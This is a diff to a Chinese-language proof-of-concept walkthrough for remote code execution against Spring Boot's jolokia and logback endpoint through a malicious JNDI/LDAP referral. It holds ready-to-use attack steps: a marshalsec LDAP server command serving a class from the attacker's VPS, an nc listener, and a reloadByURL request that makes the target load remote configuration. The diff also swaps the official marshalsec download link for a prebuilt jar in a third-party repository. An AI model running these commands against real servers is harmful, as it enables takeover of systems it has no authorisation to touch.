@@ -47,7 +47,7 @@ javac -source 1.5 -target 1.5 JNDIObject.java
 
 ### 步骤四：架设恶意 ldap 服务
 
-下载 [marshalsec](https://github.com/mbechler/marshalsec) ，使用下面命令架设对应的 ldap 服务：
+下载 [marshalsec](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发框架漏洞/SpringBoot/jolokia%20logback%20JNDI%20RCE/marshalsec-0.0.3-SNAPSHOT-all.jar) ，使用下面命令架设对应的 ldap 服务：
 
 ```bash
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
@@ -63,13 +63,12 @@ nc -lv 443
 
 ### 步骤六：从外部 URL 地址加载日志配置文件
 
-> ⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。
-
 替换实际的 your-vps-ip 地址访问 URL 触发漏洞：
 
 ```
 /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
 ```
+> ⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。
 
 ## 漏洞原理：
 
